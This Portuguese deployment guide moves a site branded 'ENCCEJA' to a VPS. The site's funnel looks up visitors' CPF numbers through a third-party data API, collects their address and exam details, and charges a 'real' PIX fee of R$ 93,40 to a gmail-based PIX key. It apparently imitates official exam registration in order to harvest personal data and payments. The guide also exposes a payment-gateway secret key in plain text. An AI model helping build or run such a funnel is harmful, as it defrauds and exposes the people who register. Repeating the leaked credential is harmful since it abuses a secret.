# ENCCEJA VPS - Instruções Completas

## Status: ✅ Ambiente Virtual Funcionando

Agora configure o projeto completo com todas as APIs reais.

## Arquivos para Upload na VPS

### 1. Upload via MobaXterm/FileZilla:

**Substitua** o arquivo atual na VPS:
- `VPS_FINAL_CLEAN_APP.py` → `/var/www/encceja/app.py`

**Adicione** os arquivos necessários:
- `witepay_gateway.py` → `/var/www/encceja/witepay_gateway.py`
- `payment_gateway.py` → `/var/www/encceja/payment_gateway.py`
- `templates/` → `/var/www/encceja/templates/`
- `static/` → `/var/www/encceja/static/`

### 2. Execute o Setup Automático:

Upload do `VPS_QUICK_SETUP_COMMANDS.sh` e execute:
```bash
chmod +x VPS_QUICK_SETUP_COMMANDS.sh
./VPS_QUICK_SETUP_COMMANDS.sh
```

## O que o Setup Faz:

1. **Para** a aplicação atual
2. **Instala** dependências adicionais (dotenv, qrcode, pillow)
3. **Cria** arquivo .env com APIs reais
4. **Testa** a aplicação completa
5. **Reinicia** o supervisor
6. **Verifica** CPF API e PIX funcionando

## APIs Configuradas:

- ✅ **CPF API**: consulta.fontesderenda.blog (token real)
- ✅ **WitePay**: sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d
- ✅ **PIX Fallback**: gerarpagamentos@gmail.com (chave real)
- ✅ **QR Code**: Geração visual com biblioteca

## Funnel Completo:

1. `/` → Redireciona para inscrição
2. `/inscricao` → Formulário CPF com API real
3. `/encceja-info` → Informações do exame
4. `/validar-dados` → Validação de dados
5. `/endereco` → Formulário endereço
6. `/local-prova` → Seleção local
7. `/pagamento` → PIX R$ 93,40 real
8. `/inscricao-sucesso` → Confirmação

## Verificação Final:

Após o setup, teste:
```bash
# Ver logs em tempo real
tail -f /var/log/encceja.log

# Testar CPF
curl -X POST http://127.0.0.1:5000/buscar-cpf -H "Content-Type: application/json" -d '{"cpf":"12345678901"}'

# Testar PIX  
curl -X POST http://127.0.0.1:5000/criar-pagamento-pix -H "Content-Type: application/json" -d '{}'
```

## Sistema Pronto:

Acesse seu domínio e teste o funnel completo com todas as APIs reais funcionando!

**Todas as funcionalidades** que estavam no Replit agora funcionam na VPS com as mesmas APIs reais.